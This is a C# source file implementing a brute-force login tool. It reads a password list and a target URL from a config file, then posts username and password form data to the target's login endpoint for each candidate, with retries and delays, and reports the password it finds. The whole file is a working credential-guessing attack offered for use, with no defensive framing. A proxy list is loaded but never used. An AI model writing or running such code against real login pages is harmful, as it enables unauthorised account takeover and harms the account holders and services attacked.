using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Threading.Tasks;
using System.IO;

namespace jth
{
    public class Account
    {
        private readonly string _passwordListPath;
        private readonly string _configPath;
        private readonly string _proxyListPath;
        private readonly string _username;

        public Account(string passwordListPath, string configPath, string proxyListPath, string username)
        {
            _passwordListPath = passwordListPath;
            _configPath = configPath;
            _proxyListPath = proxyListPath;
            _username = username;
        }

        public async Task BruteforceLogin()
        {
            if (string.IsNullOrEmpty(_passwordListPath))
            {
                throw new ArgumentException("Password list path is required");
            }

            if (string.IsNullOrEmpty(_configPath))
            {
                throw new ArgumentException("Config path is required");
            }
            if (string.IsNullOrEmpty(_username))
            {
                throw new ArgumentException("Username path is required");
            }

            if (string.IsNullOrEmpty(_proxyListPath))
            {
                throw new ArgumentException("Proxy list path is required");
            }

            var parser = new IniConfigParser(_configPath);

            var url = parser.GetConfigValue("target", "url");
            var timeout = int.Parse(parser.GetConfigValue("bruteforce", "timeout"));
            var maxAttempts = int.Parse(parser.GetConfigValue("bruteforce", "attempts"));
            var delay = int.Parse(parser.GetConfigValue("bruteforce", "delay"));

            var passwords = File.ReadAllLines(_passwordListPath);
            var proxies = File.ReadAllLines(_proxyListPath);

            foreach (var password in passwords)
            {
                var success = await TryLogin(url, password, timeout, maxAttempts, delay);

                if (success)
                {
                    Console.WriteLine($"Password Found: {password}");
                }
                else
                {
                    Console.WriteLine($"Max attempts reached for password: {password}");
                }

                await Task.Delay(delay * 1000);
            }
        }

        private async Task<bool> TryLogin(string url, string password, int timeout, int maxAttempts, int delay)
        {
            var attempts = 0;
            var success = false;

            while (!success && attempts < maxAttempts)
            {
                try
                {
                    var client = new HttpClient { Timeout = TimeSpan.FromSeconds(timeout) };

                    var content = new StringContent($"username={_username}&password={password}", System.Text.Encoding.UTF8, "application/x-www-form-urlencoded");

                    var response = await client.PostAsync(url, content);

                    if (response.IsSuccessStatusCode)
                    {
                        success = true;
                    }
                    else
                    {
                        Console.WriteLine($"Password Incorrect: {password}");
                    }
                }
                catch (TaskCanceledException ex)
                {
                    Console.WriteLine($"Request timed out: {ex.Message}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error: {ex.Message}");
                }

                attempts++;
                if (!success && attempts < maxAttempts)
                {
                    Console.WriteLine($"Retrying attempt {attempts} for password: {password}");

                    await Task.Delay(delay * 1000);
                }
            }

            return success;
        }
    }

}
